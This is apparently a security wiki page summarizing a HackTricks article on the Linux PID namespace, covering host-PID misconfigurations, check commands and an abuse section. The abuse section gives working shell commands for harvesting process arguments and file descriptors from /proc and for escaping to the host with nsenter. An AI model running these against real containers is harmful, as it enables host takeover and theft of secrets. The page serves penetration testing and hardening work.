---
title: "HackTricks: PID Namespace"
tags: [container-security, linux-namespaces, process-isolation, linux-hardening]
sources: [hacktricks-pid-namespace.md]
updated: 2026-05-01
---

# HackTricks: PID Namespace

Source: [hacktricks-pid-namespace.md](../../raw/hacktricks-pid-namespace.md)

## Key Takeaways

The PID namespace controls process numbering and visibility. Inside it, the container sees its own PID tree with its own PID 1. Outside, the host sees real host PIDs. Process visibility is a security-relevant asset: seeing host processes enables command-line argument harvesting, service discovery, and namespace-entry targeting.

## Misconfigurations

- `--pid=host` (Docker/Podman) or `hostPID: true` (Kubernetes)
- Common justification: debugging or monitoring convenience
- Even without write primitives over host processes, visibility alone is operationally valuable

## Checks

```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list — host daemons visible = host PID sharing
ls /proc | head              # Process IDs accessible from this namespace
```

## Abuse

### Confirm host processes are visible

```bash
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```

### Harvest process arguments

```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
  echo "PID=$p"
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```

### Namespace bridge via nsenter

```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```

### FD abuse via /proc

```bash
for fd_dir in /proc/[0-9]*/fd; do
  ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts    # check hidepid= option
```

If `hidepid=1` or `hidepid=2` is not set, open file descriptors for other processes may be visible — including `docker.sock`, privileged logs, or host secret files passed via `SCM_RIGHTS`.

### Full example: host PID + nsenter → host escape

```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
# If host filesystem is mounted:
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```

## Advanced Notes

- **`maskedPaths` race (runc)**: Vulnerable runc versions allowed a race during container setup to land masked-path bind mounts on the wrong target, exposing host procfs knobs (`core_pattern`, `sysrq-trigger`)
- **`insject`**: Namespace injection tool that can attach to a PID namespace after runtime initialization without pre-entering it first

## Related

- [linux-namespaces](../concepts/linux-namespaces.md)
- [container-security](../concepts/container-security.md)
- [linux-capabilities](../concepts/linux-capabilities.md)
- [HackTricks: Linux Namespaces Overview](hacktricks-namespaces-index.md)
